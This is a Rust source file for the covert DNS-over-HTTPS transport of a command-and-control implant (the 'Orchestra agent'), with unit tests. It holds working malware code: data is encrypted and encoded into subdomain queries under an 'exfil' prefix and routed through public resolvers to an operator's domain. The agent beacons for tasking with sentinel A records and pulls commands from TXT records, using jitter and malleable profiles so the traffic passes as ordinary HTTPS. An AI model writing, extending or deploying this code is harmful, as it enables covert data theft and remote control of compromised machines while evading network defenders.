//! DNS-over-HTTPS (DoH) covert transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL — not wired into the default startup path
//!
//! This module implements a `Transport` that tunnels agent messages over
//! DNS queries sent via DNS-over-HTTPS (DoH) or plaintext DNS. All DNS
//! transaction shaping — subdomain encoding, query prefix, suffix, chunk
//! size, jitter — is driven by the malleable C2 profile.
//!
//! ## Malleable DNS Transform Pipeline
//!
//! **Outbound (agent → server):**
//! 1. Encrypt payload with the session's XChaCha20-Poly1305 key
//! 2. Encode the ciphertext (hex / base32 / base64url per profile)
//! 3. Chunk into DNS-safe subdomain labels (max 63 chars per label)
//! 4. Prepend the profile's query prefix (beacon / get_A / get_TXT / post)
//! 5. Append the profile's dns_suffix
//! 6. Send as DNS query via DoH (POST or GET) or plaintext DNS
//!
//! **Inbound (server → agent):**
//! 1. Extract answer data from the DNS response (A records or TXT strings)
//! 2. Decode (hex / base32 / base64url per profile)
//! 3. Decrypt with the session's forward-secrecy key
//! 4. Deserialize the Message
//!
//! ## DNS-over-HTTPS
//!
//! When `profile.dns.headers.doh_server` is set, queries are sent as
//! RFC 8484 DoH requests. This makes DNS C2 traffic look like normal
//! HTTPS to a DNS provider. The DoH method (GET or POST) is configurable.
//!
//! ## Subdomain Encoding
//!
//! Three encoding modes are supported (set via `profile.dns.encoding`):
//! - `"hex"`: Standard hex encoding (default)
//! - `"base32"`: RFC 4648 base32, no padding (DNS-safe characters)
//! - `"base64url"`: URL-safe base64 with DNS-safe substitutions
//!
//! ## Security
//!
//! - The `agent_id` is encrypted before encoding into DNS queries
//! - SSL certificate pinning is enforced when `profile.ssl.cert_pin` is set
//! - Jitter comes from the profile's global config, not hardcoded values

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use base64::Engine;
use common::{CryptoSession, Message, Transport};
use sha2::{Digest, Sha256};
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::Arc;
use tokio::time::Duration;

use crate::malleable::MalleableProfile as AgentMalleableProfile;

/// Custom `ServerCertVerifier` that pins the server certificate by its
/// SHA-256 fingerprint (64 lowercase hex characters).  If the presented
/// end-entity certificate's DER encoding does not hash to the expected
/// fingerprint, the TLS handshake is rejected.
///
/// When `expected_fingerprint` is `None`, the verifier delegates to rustls's
/// built-in `WebPkiVerifier` with platform root certificates — i.e. standard
/// CA-based verification.
struct FingerprintVerifier {
    expected_fingerprint: Option<String>,
    webpki: rustls_0_21::client::WebPkiVerifier,
}

impl FingerprintVerifier {
    fn new(expected_fingerprint: Option<String>) -> Self {
        let mut root_store = rustls_0_21::RootCertStore::empty();
        for cert in rustls_native_certs::load_native_certs()
            .certs
            .into_iter()
            .map(|c| rustls_0_21::Certificate(c.as_ref().to_vec()))
        {
            root_store.add(&cert).ok();
        }
        let webpki = rustls_0_21::client::WebPkiVerifier::new(root_store, None);
        Self {
            expected_fingerprint,
            webpki,
        }
    }
}

impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
    fn verify_server_cert(
        &self,
        end_entity: &rustls_0_21::Certificate,
        intermediates: &[rustls_0_21::Certificate],
        server_name: &rustls_0_21::ServerName,
        scts: &mut dyn Iterator<Item = &[u8]>,
        ocsp_response: &[u8],
        now: std::time::SystemTime,
    ) -> Result<rustls_0_21::client::ServerCertVerified, rustls_0_21::Error> {
        let digest = Sha256::digest(&end_entity.0);
        let hex_fp = hex::encode(digest);

        if let Some(ref expected) = self.expected_fingerprint {
            if hex_fp != expected.to_lowercase() {
                log::error!(
                    "cert pinning: fingerprint mismatch (got {}, expected {})",
                    hex_fp,
                    expected
                );
                return Err(rustls_0_21::Error::InvalidCertificate(
                    rustls_0_21::CertificateError::UnknownIssuer,
                ));
            }
            log::debug!("cert pinning: fingerprint verified OK");
            Ok(rustls_0_21::client::ServerCertVerified::assertion())
        } else {
            self.webpki
                .verify_server_cert(end_entity, intermediates, server_name, scts, ocsp_response, now)
        }
    }

    fn verify_tls12_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls12_signature(message, cert, dss)
    }

    fn verify_tls13_signature(
        &self,
        message: &[u8],
        cert: &rustls_0_21::Certificate,
        dss: &rustls_0_21::DigitallySignedStruct,
    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
        self.webpki.verify_tls13_signature(message, cert, dss)
    }
}

// ── Subdomain Encoding ───────────────────────────────────────────────────────

/// Encode binary data into a DNS-safe subdomain string.
///
/// Three modes are supported:
/// - `"hex"`: lowercase hex encoding (2 chars per byte)
/// - `"base32"`: RFC 4648 base32 without padding
/// - `"base64url"`: URL-safe base64 (+ → -, / → _)
fn encode_subdomain(data: &[u8], encoding: &str) -> String {
    match encoding {
        "base32" => {
            base32::encode(base32::Alphabet::RFC4648 { padding: false }, data).to_ascii_lowercase()
        }
        "base64url" => {
            let b64 =
                base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(data);
            // DNS-safe substitutions for extra safety.
            b64.replace('+', "-").replace('/', "_")
        }
        _ => {
            // Default: hex encoding.
            hex::encode(data)
        }
    }
}

/// Decode a DNS subdomain string back into binary data.
fn decode_subdomain(data: &str, encoding: &str) -> Result<Vec<u8>> {
    match encoding {
        "base32" => base32::decode(base32::Alphabet::RFC4648 { padding: false }, data)
            .ok_or_else(|| anyhow!("base32 decode failed for subdomain data")),
        "base64url" => {
            // Reverse DNS-safe substitutions.
            let corrected = data.replace('-', "+").replace('_', "/");
            base64::engine::general_purpose::URL_SAFE_NO_PAD
                .decode(&corrected)
                .map_err(|e| anyhow!("base64url decode failed: {}", e))
        }
        _ => hex::decode(data).map_err(|e| anyhow!("hex decode failed: {}", e)),
    }
}

/// Split an encoded string into DNS-safe subdomain labels.
///
/// Each label is at most 63 characters. Labels are separated by dots.
/// The total domain name must not exceed 253 characters; this function
/// does not enforce that — the caller must chunk at a higher level.
fn chunk_into_labels(encoded: &str, max_label_len: usize) -> Vec<String> {
    encoded
        .as_bytes()
        .chunks(max_label_len)
        .map(|c| String::from_utf8_lossy(c).to_string())
        .collect()
}

// ── DoH Transport ────────────────────────────────────────────────────────────

/// DNS-over-HTTPS transport driven by a malleable C2 profile.
///
/// All DNS query construction, encoding, chunking, and transport are
/// driven by the profile. The agent never hardcodes DNS patterns.
pub struct DohTransport {
    profile: Arc<AgentMalleableProfile>,
    client: reqwest::Client,
    session: CryptoSession,
    agent_id: String,
    /// Monotonic sequence counter for DNS query deduplication.
    seq: AtomicU32,
    /// Random session identifier embedded in DNS queries.
    session_id: u32,
    /// Legacy fields from common config for backward compat.
    doh_beacon_sentinel: String,
    host_header: String,
}

impl DohTransport {
    /// Create a new DoH transport from a malleable profile.
    ///
    /// The `common_profile` parameter provides legacy fields (doh_beacon_sentinel,
    /// host_header, etc.) that are not yet part of the malleable profile struct.
    pub async fn new(
        profile: &AgentMalleableProfile,
        session: CryptoSession,
        agent_id: String,
        common_profile: Option<&common::config::MalleableProfile>,
    ) -> Result<Self> {
        // Extract legacy config fields if provided.
        let doh_beacon_sentinel = common_profile
            .map(|p| p.doh_beacon_sentinel.clone())
            .unwrap_or_else(|| "1.2.3.4".to_string());
        let host_header = common_profile
            .map(|p| p.host_header.clone())
            .unwrap_or_default();

        // Build default headers for DoH.
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::USER_AGENT,
            reqwest::header::HeaderValue::from_str(&profile.global.user_agent)?,
        );
        headers.insert(
            reqwest::header::ACCEPT,
            reqwest::header::HeaderValue::from_static("application/dns-json"),
        );

        // Build the reqwest client with TLS configuration from the profile.
        let cert_fingerprint = if profile.has_cert_pin() {
            Some(profile.ssl.cert_pin.clone())
        } else {
            None
        };

        let client = if cert_fingerprint.is_some() {
            let verifier = FingerprintVerifier::new(cert_fingerprint);
            let config = rustls_0_21::ClientConfig::builder()
                .with_safe_defaults()
                .with_custom_certificate_verifier(Arc::new(verifier))
                .with_no_client_auth();
            reqwest::Client::builder()
                .use_preconfigured_tls(config)
                .default_headers(headers)
                .build()?
        } else {
            reqwest::Client::builder()
                .use_rustls_tls()
                .default_headers(headers)
                .build()?
        };

        Ok(Self {
            profile: Arc::new(profile.clone()),
            client,
            session,
            agent_id,
            seq: AtomicU32::new(0),
            session_id: rand::random(),
            doh_beacon_sentinel,
            host_header,
        })
    }

    /// Select the DoH resolver endpoint.
    ///
    /// Uses `profile.dns.headers.doh_server` if set; otherwise falls back
    /// to a random entry from the built-in resolver list.
    fn select_resolver(&self) -> String {
        let doh_server = &self.profile.dns.headers.doh_server;
        if !doh_server.is_empty() {
            return doh_server.clone();
        }
        // Fallback to built-in resolvers.
        const DOH_RESOLVERS: &[&str] = &[
            "https://cloudflare-dns.com/dns-query",
            "https://dns.google/resolve",
            "https://dns.quad9.net/dns-query",
        ];
        let idx = rand::random::<usize>() % DOH_RESOLVERS.len();
        DOH_RESOLVERS[idx].to_string()
    }

    /// Resolve the DNS suffix. Uses `profile.dns.dns_suffix` if set,
    /// otherwise falls back to the legacy `host_header`.
    fn dns_suffix(&self) -> &str {
        let suffix = &self.profile.dns.dns_suffix;
        if !suffix.is_empty() {
            suffix
        } else {
            &self.host_header
        }
    }

    /// Build the full DNS query domain name.
    ///
    /// Format: `{encoded_subdomain}.{prefix}.{session_hex}.{suffix}`
    fn build_domain(&self, prefix: &str, encoded_data: &str) -> String {
        let session_hex = format!("{:x}", self.session_id);
        let suffix = self.dns_suffix();

        if encoded_data.is_empty() {
            format!("{}.{}.{}", prefix, session_hex, suffix)
        } else {
            // Chunk the encoded data into DNS-safe labels.
            let labels = chunk_into_labels(encoded_data, 63);
            let data_part = labels.join(".");
            format!("{}.{}.{}.{}", data_part, prefix, session_hex, suffix)
        }
    }

    /// Execute a DNS query via DoH.
    ///
    /// Supports both GET (JSON) and POST (RFC 8484 wireformat) methods.
    async fn execute_query(&self, domain: &str, qtype: &str) -> Result<serde_json::Value> {
        let doh_method = &self.profile.dns.headers.doh_method;
        let resolver = self.select_resolver();

        match doh_method.to_uppercase().as_str() {
            "POST" => self.execute_doh_post(&resolver, domain, qtype).await,
            _ => self.execute_doh_get(&resolver, domain, qtype).await,
        }
    }

    /// Execute a DoH query using GET with JSON response (RFC 8484).
    async fn execute_doh_get(
        &self,
        resolver: &str,
        domain: &str,
        qtype: &str,
    ) -> Result<serde_json::Value> {
        let url = format!("{}?name={}&type={}", resolver, domain, qtype);

        match self.client.get(&url).send().await {
            Ok(resp) => {
                let json: serde_json::Value = resp.json().await?;
                Ok(json)
            }
            Err(e) => {
                log::warn!("DoH GET query failed: {}", e);
                // Try fallback resolvers.
                self.execute_doh_get_fallback(domain, qtype).await
            }
        }
    }

    /// Try fallback DoH resolvers when the primary fails.
    async fn execute_doh_get_fallback(
        &self,
        domain: &str,
        qtype: &str,
    ) -> Result<serde_json::Value> {
        const FALLBACKS: &[&str] = &[
            "https://cloudflare-dns.com/dns-query",
            "https://dns.google/resolve",
            "https://dns.quad9.net/dns-query",
        ];
        for resolver in FALLBACKS {
            let url = format!("{}?name={}&type={}", resolver, domain, qtype);
            match self.client.get(&url).send().await {
                Ok(resp) => {
                    let json: serde_json::Value = resp.json().await?;
                    return Ok(json);
                }
                Err(e) => {
                    log::warn!("DoH fallback {} failed: {}", resolver, e);
                    continue;
                }
            }
        }
        Err(anyhow!("All DoH resolvers failed for query '{}'", domain))
    }

    /// Execute a DoH query using POST with RFC 8484 wireformat.
    async fn execute_doh_post(
        &self,
        resolver: &str,
        domain: &str,
        qtype: &str,
    ) -> Result<serde_json::Value> {
        // Build a DNS wireformat query.
        let wire_query = self.build_dns_wireformat(domain, qtype)?;

        let resp = self
            .client
            .post(resolver)
            .header("Content-Type", "application/dns-message")
            .header("Accept", "application/dns-message")
            .body(wire_query)
            .send()
            .await
            .map_err(|e| anyhow!("DoH POST query failed: {}", e))?;

        let bytes = resp.bytes().await?;
        self.parse_dns_wireformat_response(&bytes)
    }

    /// Build a DNS wireformat query packet.
    fn build_dns_wireformat(&self, domain: &str, qtype: &str) -> Result<Vec<u8>> {
        // Simple DNS query builder.
        // Header: 12 bytes (ID, flags, QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0)
        // Question: QNAME + QTYPE(2) + QCLASS(2)
        let mut packet = Vec::with_capacity(256);

        // Transaction ID (random).
        let txid: u16 = rand::random();
        packet.extend_from_slice(&txid.to_be_bytes());

        // Flags: standard query (RD=1).
        packet.extend_from_slice(&[0x01, 0x00]);

        // QDCOUNT=1, rest 0.
        packet.extend_from_slice(&1u16.to_be_bytes());
        packet.extend_from_slice(&0u16.to_be_bytes());
        packet.extend_from_slice(&0u16.to_be_bytes());
        packet.extend_from_slice(&0u16.to_be_bytes());

        // QNAME: domain encoded as labels.
        for label in domain.split('.') {
            let label_bytes = label.as_bytes();
            packet.push(label_bytes.len() as u8);
            packet.extend_from_slice(label_bytes);
        }
        packet.push(0); // Root label.

        // QTYPE.
        let qtype_val: u16 = match qtype {
            "A" => 1,
            "TXT" => 16,
            "AAAA" => 28,
            _ => 1,
        };
        packet.extend_from_slice(&qtype_val.to_be_bytes());

        // QCLASS: IN = 1.
        packet.extend_from_slice(&1u16.to_be_bytes());

        Ok(packet)
    }

    /// Parse a DNS wireformat response into a JSON-like value.
    ///
    /// This is a minimal parser that extracts A and TXT answers.
    fn parse_dns_wireformat_response(&self, data: &[u8]) -> Result<serde_json::Value> {
        if data.len() < 12 {
            anyhow::bail!("DNS response too short");
        }

        // Parse header.
        let _ancount = u16::from_be_bytes([data[6], data[7]]) as usize;
        let _qdcount = u16::from_be_bytes([data[4], data[5]]) as usize;

        // Skip header.
        let mut pos = 12;

        // Skip question section.
        for _ in 0.._qdcount {
            // Skip QNAME.
            while pos < data.len() {
                let len = data[pos] as usize;
                if len == 0 {
                    pos += 1;
                    break;
                }
                // Check for compression pointer.
                if len >= 0xC0 {
                    pos += 2;
                    break;
                }
                pos += len + 1;
            }
            pos += 4; // QTYPE + QCLASS
        }

        // Parse answer section.
        let mut answers = Vec::new();

        for _ in 0.._ancount {
            if pos + 12 > data.len() {
                break;
            }

            // Skip name (could be a compression pointer).
            if data[pos] >= 0xC0 {
                pos += 2;
            } else {
                while pos < data.len() && data[pos] != 0 {
                    pos += data[pos] as usize + 1;
                }
                pos += 1;
            }

            let rtype = u16::from_be_bytes([data[pos], data[pos + 1]]);
            let _rdlength = u16::from_be_bytes([data[pos + 8], data[pos + 9]]) as usize;
            pos += 10;

            if pos + _rdlength > data.len() {
                break;
            }

            match rtype {
                1 => {
                    // A record: 4 bytes → IPv4 address.
                    if _rdlength == 4 {
                        let ip = format!(
                            "{}.{}.{}.{}",
                            data[pos], data[pos + 1], data[pos + 2], data[pos + 3]
                        );
                        answers.push(serde_json::json!({
                            "type": 1,
                            "data": ip
                        }));
                    }
                }
                16 => {
                    // TXT record: one or more character-strings.
                    let mut txt_data = String::new();
                    let mut txt_pos = pos;
                    while txt_pos < pos + _rdlength {
                        let str_len = data[txt_pos] as usize;
                        txt_pos += 1;
                        if txt_pos + str_len > data.len() {
                            break;
                        }
                        txt_data
                            .push_str(&String::from_utf8_lossy(&data[txt_pos..txt_pos + str_len]));
                        txt_pos += str_len;
                    }
                    answers.push(serde_json::json!({
                        "type": 16,
                        "data": txt_data
                    }));
                }
                _ => {}
            }

            pos += _rdlength;
        }

        Ok(serde_json::json!({ "Answer": answers }))
    }

    /// Check for a "tasking available" sentinel in A record answers.
    fn check_tasking_sentinel(&self, json: &serde_json::Value) -> bool {
        json.get("Answer")
            .and_then(|a| a.as_array())
            .map(|arr| {
                arr.iter().any(|r| {
                    r.get("data")
                        .and_then(|d| d.as_str())
                        .map(|s| s.trim() == self.doh_beacon_sentinel)
                        .unwrap_or(false)
                })
            })
            .unwrap_or(false)
    }

    /// Decode A record answers into raw bytes (4 bytes per IPv4 address).
    fn decode_a_records(&self, json: &serde_json::Value) -> Vec<u8> {
        let mut bytes = Vec::new();
        if let Some(answers) = json.get("Answer").and_then(|a| a.as_array()) {
            for record in answers {
                if record.get("type").and_then(|t| t.as_u64()) == Some(1) {
                    if let Some(ip_str) = record.get("data").and_then(|d| d.as_str()) {
                        // Skip the idle sentinel IP.
                        if ip_str.trim() == self.doh_beacon_sentinel {
                            continue;
                        }
                        // Skip the dns_idle address.
                        if ip_str.trim() == self.profile.global.dns_idle {
                            continue;
                        }
                        for octet in ip_str.trim().split('.') {
                            if let Ok(b) = octet.parse::<u8>() {
                                bytes.push(b);
                            }
                        }
                    }
                }
            }
        }
        bytes
    }

    /// Concatenate TXT record strings from the answer section.
    fn extract_txt_records(&self, json: &serde_json::Value) -> String {
        let mut result = String::new();
        if let Some(answers) = json.get("Answer").and_then(|a| a.as_array()) {
            for record in answers {
                if record.get("type").and_then(|t| t.as_u64()) == Some(16) {
                    if let Some(data) = record.get("data").and_then(|d| d.as_str()) {
                        result.push_str(data.trim_matches('"'));
                    }
                }
            }
        }
        result
    }

    /// Calculate jittered sleep duration from the profile.
    fn jittered_sleep(&self) -> Duration {
        self.profile.jittered_sleep()
    }

    /// Get the encoding mode from the profile.
    fn encoding(&self) -> &str {
        &self.profile.dns.encoding
    }

    /// Get the max TXT chunk size from the profile.
    fn max_txt_size(&self) -> u16 {
        self.profile.dns.max_txt_size
    }

    /// Get the beacon prefix from the profile.
    fn beacon_prefix(&self) -> &str {
        let beacon = &self.profile.dns.beacon;
        if !beacon.is_empty() {
            beacon
        } else {
            // Fallback to IOC beacon prefix.
            ""
        }
    }

    /// Get the post (exfil) prefix from the profile.
    fn post_prefix(&self) -> &str {
        let post = &self.profile.dns.post;
        if !post.is_empty() {
            post
        } else {
            // Fallback to IOC task prefix.
            ""
        }
    }

    /// Get the get_TXT prefix from the profile.
    fn get_txt_prefix(&self) -> &str {
        let get_txt = &self.profile.dns.get_TXT;
        if !get_txt.is_empty() {
            get_txt
        } else {
            ""
        }
    }

    /// Get the get_A prefix from the profile.
    fn get_a_prefix(&self) -> &str {
        let get_a = &self.profile.dns.get_A;
        if !get_a.is_empty() {
            get_a
        } else {
            ""
        }
    }
}

#[async_trait]
impl Transport for DohTransport {
    async fn send(&mut self, msg: Message) -> Result<()> {
        log::debug!("Malleable DoH C2 Send (data exfiltration)");

        // Serialize and encrypt the payload.
        let serialized = bincode::serialize(&msg)?;
        let ciphertext = self.session.encrypt(&serialized);

        // Encode the ciphertext using the profile's encoding mode.
        let encoded = encode_subdomain(&ciphertext, self.encoding());

        // Determine the prefix for data exfiltration queries.
        let prefix = self.post_prefix();

        // Calculate chunk size in encoded characters. Each encoded character
        // maps to a subdomain label, so we chunk at the max_txt_size boundary.
        let max_chunk_chars = self.max_txt_size() as usize;

        // Send in chunks, each as a separate DNS query.
        let chunks: Vec<&str> = encoded
            .as_bytes()
            .chunks(max_chunk_chars)
            .map(|c| std::str::from_utf8(c).unwrap_or(""))
            .collect();

        for chunk in &chunks {
            self.seq.fetch_add(1, Ordering::Relaxed);
            let domain = self.build_domain(prefix, chunk);

            // Send via TXT query to exfiltrate data.
            let _ = self.execute_query(&domain, "TXT").await?;

            // Sleep between fragments with profile-driven jitter.
            let sleep_dur = self.jittered_sleep();
            let frag_delay = Duration::from_millis(sleep_dur.as_millis() as u64 / 10);
            crate::memory_guard::guarded_sleep(frag_delay, None, 0).await?;
        }

        Ok(())
    }

    async fn recv(&mut self) -> Result<Message> {
        log::debug!("Malleable DoH C2 Recv (task fetch)");

        // Beacon loop: query for tasking availability.
        loop {
            // Build the beacon query domain.
            let beacon_prefix = self.beacon_prefix();
            let beacon_domain = self.build_domain(beacon_prefix, "");

            // Send beacon query as A record lookup.
            let json = self.execute_query(&beacon_domain, "A").await?;

            // Check for the tasking sentinel.
            if self.check_tasking_sentinel(&json) {
                break;
            }

            // No tasking available — sleep with profile-driven jitter.
            let sleep_dur = self.jittered_sleep();
            crate::memory_guard::guarded_sleep(sleep_dur, None, 0).await?;
        }

        // Tasking is available. Fetch data via TXT record.
        let txt_prefix = self.get_txt_prefix();
        let task_domain = self.build_domain(txt_prefix, "");
        let txt_json = self.execute_query(&task_domain, "TXT").await?;

        // Concatenate TXT record strings.
        let full_encoded = self.extract_txt_records(&txt_json);

        if full_encoded.is_empty() {
            anyhow::bail!("TXT record response was empty after tasking sentinel");
        }

        // Decode using the profile's encoding mode.
        let ciphertext = decode_subdomain(&full_encoded, self.encoding())?;

        // Decrypt with the session key.
        let plaintext = self.session.decrypt(&ciphertext)?;

        // Deserialize the message.
        let msg = bincode::deserialize(&plaintext)?;

        Ok(msg)
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::malleable::{
        DnsConfig, GlobalConfig, HttpTransformConfig, HttpTransactionConfig,
        MalleableProfile as AgentMalleableProfile, ProfileInfo, SslConfig,
        TransformType,
    };
    use std::collections::HashMap;

    /// Build a minimal test profile with DNS config.
    fn test_profile() -> AgentMalleableProfile {
        AgentMalleableProfile {
            profile: ProfileInfo {
                name: "dns-test".to_string(),
                author: "tester".to_string(),
                description: "test dns profile".to_string(),
            },
            global: GlobalConfig {
                user_agent: "TestAgent/1.0".to_string(),
                jitter: 10,
                sleep_time: 30,
                dns_idle: "0.0.0.0".to_string(),
                dns_sleep: 0,
            },
            ssl: SslConfig {
                enabled: false,
                cert_pin: String::new(),
                ja3_fingerprint: String::new(),
                sni: String::new(),
            },
            http_get: None,
            http_post: None,
            dns: DnsConfig {
                enabled: true,
                beacon: "beacon.".to_string(),
                get_A: "api.".to_string(),
                get_TXT: "txt.".to_string(),
                post: "upload.".to_string(),
                max_txt_size: 252,
                dns_suffix: "example.com".to_string(),
                encoding: "hex".to_string(),
                headers: crate::malleable::DnsHeadersConfig::default(),
            },
        }
    }

    #[test]
    fn test_encode_decode_hex() {
        let data = b"hello dns world";
        let encoded = encode_subdomain(data, "hex");
        let decoded = decode_subdomain(&encoded, "hex").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_encode_decode_base32() {
        let data = b"hello dns world";
        let encoded = encode_subdomain(data, "base32");
        // Base32 should be lowercase letters or digits 2-7 (DNS-safe).
        assert!(encoded.chars().all(|c| c.is_ascii_lowercase() || ('2'..='7').contains(&c)));
        // No padding.
        assert!(!encoded.contains('='));
        let decoded = decode_subdomain(&encoded, "base32").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_encode_decode_base64url() {
        let data = b"hello dns world";
        let encoded = encode_subdomain(data, "base64url");
        // Should not contain + or / (DNS-safe).
        assert!(!encoded.contains('+'));
        assert!(!encoded.contains('/'));
        let decoded = decode_subdomain(&encoded, "base64url").unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_chunk_into_labels() {
        let encoded = "a".repeat(100);
        let labels = chunk_into_labels(&encoded, 63);
        assert_eq!(labels.len(), 2);
        assert_eq!(labels[0].len(), 63);
        assert_eq!(labels[1].len(), 37);
    }

    #[test]
    fn test_build_domain() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: String::new(),
        };

        // With data.
        let domain = transport.build_domain("upload.", "abcdef");
        assert!(domain.contains("abcdef"));
        assert!(domain.contains("upload."));
        assert!(domain.contains("example.com"));
        assert!(domain.contains("deadbeef"));

        // Without data (beacon).
        let domain = transport.build_domain("beacon.", "");
        assert!(domain.starts_with("beacon."));
        assert!(domain.contains("example.com"));
    }

    #[test]
    fn test_dns_suffix_fallback() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: "fallback.example.com".to_string(),
        };

        // Should use the profile's dns_suffix, not the host_header.
        assert_eq!(transport.dns_suffix(), "example.com");
    }

    #[test]
    fn test_decode_a_records() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: String::new(),
        };

        let json = serde_json::json!({
            "Answer": [
                {"type": 1, "data": "10.0.0.1"},
                {"type": 1, "data": "10.0.0.2"},
                // Sentinel should be skipped.
                {"type": 1, "data": "1.2.3.4"},
                // dns_idle (0.0.0.0) should be skipped.
                {"type": 1, "data": "0.0.0.0"},
            ]
        });

        let bytes = transport.decode_a_records(&json);
        assert_eq!(bytes, vec![10, 0, 0, 1, 10, 0, 0, 2]);
    }

    #[test]
    fn test_extract_txt_records() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: String::new(),
        };

        let json = serde_json::json!({
            "Answer": [
                {"type": 16, "data": "\"part1\""},
                {"type": 16, "data": "\"part2\""},
            ]
        });

        let txt = transport.extract_txt_records(&json);
        assert_eq!(txt, "part1part2");
    }

    #[test]
    fn test_wireformat_roundtrip() {
        let profile = test_profile();
        let transport = DohTransport {
            profile: Arc::new(profile),
            client: reqwest::Client::new(),
            session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
            agent_id: "test-agent".to_string(),
            seq: AtomicU32::new(0),
            session_id: 0xDEADBEEF,
            doh_beacon_sentinel: "1.2.3.4".to_string(),
            host_header: String::new(),
        };

        let wire = transport.build_dns_wireformat("test.example.com", "A").unwrap();
        // Should have at least 12 bytes header + question.
        assert!(wire.len() > 12);
        // Transaction ID should be non-zero (random).
        assert!(wire[0] != 0 || wire[1] != 0);
    }
}
